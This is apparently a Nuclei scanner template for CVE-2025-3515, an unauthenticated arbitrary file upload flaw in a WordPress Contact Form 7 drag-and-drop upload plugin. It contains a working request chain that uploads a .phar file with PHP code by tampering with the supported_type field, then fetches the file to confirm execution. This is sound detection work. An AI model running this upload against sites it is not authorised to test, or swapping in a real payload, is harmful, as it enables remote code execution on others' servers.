id: CVE-2025-3515

info:
  name: Contact Form 7 Drag and Drop Multiple File Upload - Arbitrary File Upload
  author: narasimha-1511
  severity: high
  description: |
    The Drag and Drop Multiple File Upload for Contact Form 7 plugin for WordPress is vulnerable to arbitrary file uploads due to insufficient file type validation in all versions up to, and including, 1.3.8.9. This makes it possible for unauthenticated attackers to bypass the plugin's blacklist and upload .phar or other dangerous file types on the affected site's server, which may make remote code execution possible on the servers that are configured to handle .phar files as executable PHP scripts, particularly in default Apache+mod_php configurations where the file extension is not strictly validated before being passed to the PHP interpreter.
  reference:
    - https://www.wiz.io/vulnerability-database/cve/cve-2025-3515
    - https://nvd.nist.gov/vuln/detail/CVE-2025-3515
    - https://github.com/advisories/GHSA-63j5-3fh3-7x8g
    - https://plugins.trac.wordpress.org/changeset/3310153
    - https://www.wordfence.com/threat-intel/vulnerabilities/id/e1298242-61d2-495e-bae7-96b5e12bd03d?source=cve
    - https://github.com/Professor6T9/CVE-2025-3515
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 8.1
    cve-id: CVE-2025-3515
    cwe-id: CWE-434
    epss-score: 0.09
    epss-percentile: 0.273
    cpe: cpe:2.3:a:codedropz:drag_and_drop_multiple_file_upload_-_contact_form_7:*:*:*:*:*:wordpress:*:*
  metadata:
    vendor: codedropz
    product: drag_and_drop_multiple_file_upload_-_contact_form_7
    shodan-query: "wp-content/plugins/drag-and-drop-multiple-file-upload-contact-form-7"
  tags: cve,cve-2025,wordpress,wp-plugin,file-upload,rce,kev,unauth,intrusive

variables:
  filename: "{{rand_text_alpha(8)}}"
  boundary: "----WebKitFormBoundary{{rand_text_alpha(16)}}"
  marker: "{{rand_text_alpha(32)}}"

flow: http(1) && http(2) && http(3)

http:
  - method: GET
    path:
      - "{{BaseURL}}/wp-content/plugins/drag-and-drop-multiple-file-upload-contact-form-7/readme.txt"
    
    matchers:
      - type: word
        words:
          - "Drag and Drop Multiple File Upload"
          - "Contact Form 7"
        condition: and
        internal: true

  - raw:
      - |
        POST {{BaseURL}}/wp-admin/admin-ajax.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/form-data; boundary={{boundary}}
        Content-Length: 500
        
        --{{boundary}}
        Content-Disposition: form-data; name="action"
        
        dnd_codedropz_upload
        --{{boundary}}
        Content-Disposition: form-data; name="type_of_ajax"
        
        upload
        --{{boundary}}
        Content-Disposition: form-data; name="upload_name"
        
        {{filename}}.phar
        --{{boundary}}
        Content-Disposition: form-data; name="supported_type"
        
        phar
        --{{boundary}}
        Content-Disposition: form-data; name="size_limit"
        
        10240000
        --{{boundary}}
        Content-Disposition: form-data; name="upload_file"; filename="{{filename}}.phar"
        Content-Type: application/x-httpd-php
        
        <?php echo "{{marker}}"; ?>
        --{{boundary}}--

    matchers:
      - type: dsl
        dsl:
          - 'status_code == 200'
          - 'contains(body, "success")'
          - '!contains(body, "File type is not allowed")'
        condition: and
        internal: true

  - method: GET
    path:
      - "{{BaseURL}}/wp-content/uploads/wp_dndcf7_uploads/{{filename}}.phar"
    
    matchers:
      - type: dsl
        dsl:
          - 'status_code == 200'
          - 'contains(body, "{{marker}}")'
        condition: and
